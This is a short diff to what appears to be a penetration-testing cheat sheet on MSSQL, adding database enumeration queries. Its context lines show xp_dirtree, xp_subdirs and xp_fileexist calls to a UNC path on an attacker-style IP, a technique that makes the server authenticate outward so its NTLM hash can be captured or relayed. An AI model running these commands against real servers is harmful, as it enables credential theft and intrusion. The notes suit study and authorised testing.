@@ -341,6 +341,11 @@ USE master
 exec master.dbo.xp_dirtree '\\10.10.14.23\relay'
 EXEC master..xp_subdirs '\\10.10.14.23\anything\'
 EXEC master..xp_fileexist '\\10.10.14.23\anything\'
+
+# Enum
+SELECT name FROM master.dbo.sysdatabases;
+USE [DBname];
+SELECT * FROM [DBname].INFORMATION_SCHEMA.TABLES;
 ```
 
 ## ExploitDB
